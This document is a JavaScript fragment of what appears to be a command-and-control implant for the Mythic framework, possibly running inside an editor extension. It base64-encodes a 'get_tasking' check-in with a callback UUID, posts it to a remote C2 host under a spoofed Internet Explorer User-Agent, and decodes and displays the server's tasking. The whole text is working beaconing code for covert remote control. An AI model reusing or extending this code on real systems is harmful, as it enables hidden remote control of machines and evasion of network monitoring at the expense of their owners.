const taskingJson = JSON.stringify({
  "action": "get_tasking",
  "tasking_size": -1
})
const taskingBuffer = Buffer.from(callbackUUID + taskingJson, 'utf-8')
const encoded = taskingBuffer.toString('base64')
const taskingOptions = { 
  protocol: 'http:',
  host: mythicHost,
  port: mythicPort,
  path: mythicPath,
  method: 'POST',
  headers: {
    'Accept': 'application/json',
    'Content-Length': encoded.length,
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'
  }
}
let taskingRequest = http.request(taskingOptions, (res) => {
  outchan.append("\nTasking response: " + res.statusMessage + "\n");

  res.on('data', (d) => {
    const decodedTaskingResponse = Buffer.from(d.toString('utf-8'), 'base64').toString('utf-8')
    const taskingResponseJSON = decodedTaskingResponse.slice(36)
    //const parsedTaskingResponse = JSON.parse(taskingResponseJSON)
    outchan.append(`${taskingResponseJSON}`);
  });
});
taskingRequest.on('error', (err) => {
  console.log(err)
  outchan.append("\n" + err.message + "\n");
});
taskingRequest.write(encoded);
taskingRequest.end();